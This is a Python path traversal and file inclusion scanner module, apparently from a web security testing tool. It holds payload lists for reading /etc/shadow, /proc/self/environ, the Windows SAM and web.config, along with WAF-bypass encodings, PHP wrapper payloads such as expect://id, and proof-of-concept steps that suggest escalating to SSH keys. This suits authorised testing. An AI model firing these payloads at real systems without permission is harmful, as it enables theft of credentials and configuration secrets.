"""Path Traversal / LFI Scanner — Deep file inclusion detection.

Covers:
  - Linux file read (/etc/passwd, /etc/shadow, /proc/self)
  - Windows file read (win.ini, boot.ini, web.config, hosts)
  - Null byte injection (%00)
  - Double/triple URL encoding
  - IIS-specific backslash traversal
  - UTF-8 overlong encoding
  - PHP wrappers (php://filter, php://input, data://)
  - Tests ALL params (not just file/path-named params)
  - POST body injection
  - WAF bypass integration
"""
from __future__ import annotations
import asyncio, re
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# ── Traversal payloads — Linux ────────────────────────────────

LINUX_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # URL encoding
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    # Double URL encoding
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Triple encoding
    "..%25252F..%25252F..%25252Fetc%25252Fpasswd",
    # Mixed encoding
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Dot-dot-slash variants
    "....//....//....//etc/passwd",
    "....//../../../etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",  # UTF-8 overlong
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Fullwidth solidus
    # Null byte termination (for old PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.html",
    "../../../etc/passwd\x00",
    # Absolute path
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/proc/self/fd/0",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
    "expect://id",
    # Wrap-around (try escaping a chroot)
    "/var/www/../../etc/passwd",
    # WAF bypass
    "....//....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",   # Tomcat path param bypass
    "..\\..\\..\\..\\/etc/passwd",  # Mixed separators
]

# ── Traversal payloads — Windows ──────────────────────────────

WINDOWS_PAYLOADS = [
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5cwindows%5cwin.ini",    # URL encoded backslash
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",  # Double encoded
    "..\\..\\..\\boot.ini",
    "..\\..\\..\\inetpub\\wwwroot\\web.config",
    "C:\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\windows\\system32\\config\\sam",
    # IIS tilde
    "~1/",
]

# ── Signature detection ───────────────────────────────────────

LINUX_SIGS = [
    r"root:x:0:0", r"root:.*:/bin/(bash|sh)",
    r"daemon:x:", r"bin:x:", r"nobody:x:",
    r"PATH=", r"HOME=", r"HOSTNAME=",
    r"Linux version", r"proc/version",
    r"<\?php", r"phpinfo\(\)",
]

WINDOWS_SIGS = [
    r"\[fonts\]", r"\[extensions\]",
    r"\[boot loader\]", r"\[operating systems\]",
    r"<configuration>", r"<connectionStrings>",
    r"localhost", r"127\.0\.0\.1",
    r"\\\\Windows\\\\", r"WINDOWS",
]

ALL_SIGS = LINUX_SIGS + WINDOWS_SIGS

# High-priority params (tested with ALL payloads)
PRIORITY_PARAMS = {
    "file", "path", "page", "template", "include", "doc", "document",
    "filename", "filepath", "folder", "dir", "load", "read", "view",
    "resource", "content", "input", "conf", "config", "log", "data",
    "src", "source", "module", "inc", "location", "lang", "locale",
    "attachment", "download", "asset",
}

REMEDIATION = (
    "Never use user input directly in file system operations. "
    "Use a whitelist of allowed file names/paths. "
    "Canonicalize the path and verify it's within the expected directory. "
    "Set a chroot or sandbox for the file-serving component. "
    "Disable PHP wrappers (allow_url_include=Off, allow_url_fopen=Off)."
)


class PathTraversalScanner(BaseScanner):
    name = "path_traversal"
    description = "Detects Path Traversal / LFI with encoding bypass, null bytes, PHP wrappers"
    tags = ["file", "lfi", "owasp-a01"]

    async def run(self, state: ScanState) -> List[Finding]:
        tasks = []
        seen = set()

        for url, params in state.target.discovered_params.items():
            for param in params:
                is_priority = param.lower() in PRIORITY_PARAMS

                if is_priority:
                    # Full test suite for file-related params
                    for payload in LINUX_PAYLOADS:
                        tasks.append(self._test(url, param, payload, "GET", "query"))
                    for payload in WINDOWS_PAYLOADS:
                        tasks.append(self._test(url, param, payload, "GET", "query"))
                    # POST body
                    for payload in LINUX_PAYLOADS[:8]:
                        tasks.append(self._test(url, param, payload, "POST", "body"))
                else:
                    # Light test for other params (top 5 most common payloads)
                    for payload in LINUX_PAYLOADS[:5]:
                        tasks.append(self._test(url, param, payload, "GET", "query"))
                    for payload in WINDOWS_PAYLOADS[:3]:
                        tasks.append(self._test(url, param, payload, "GET", "query"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        findings = []
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter, r.vuln_type)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test(self, url, param, payload, method, inject_in) -> Optional[Finding]:
        for variant in self.get_waf_bypass_variants(payload, "path_traversal"):
            resp, raw_req = await self.test_payload(url, method, param, variant, inject_in=inject_in)
            if not resp:
                continue
            body = resp.text
            for sig in ALL_SIGS:
                m = re.search(sig, body, re.IGNORECASE)
                if m:
                    is_windows = sig in [re.escape(s) for s in WINDOWS_SIGS] or "\\" in payload
                    target_file = "win.ini" if is_windows else "/etc/passwd"
                    self.record_payload_result(variant, "path_traversal", success=True)
                    return self.make_finding(
                        title=f"Path Traversal / LFI in '{param}'",
                        vuln_type="path_traversal", severity=Severity.HIGH,
                        url=url, parameter=param, method=method, payload=variant,
                        evidence=f"File content detected: {m.group(0)}",
                        request=raw_req, response=body[:500],
                        cwe_id="CWE-22", owasp_category="A01:2021 - Broken Access Control",
                        description=(
                            f"Parameter '{param}' ({method} {inject_in}) allows reading "
                            f"arbitrary server files via path traversal. "
                            f"Target file: {target_file}. Payload: {variant}"
                        ),
                        remediation=REMEDIATION,
                        poc_steps=[
                            f"1. {method} {url}",
                            f"2. Set '{param}' to {variant} (in {inject_in})",
                            f"3. File content in response: {m.group(0)}",
                            "4. Escalate: read source code, config files, /etc/shadow, SSH keys",
                        ],
                    )
        return None
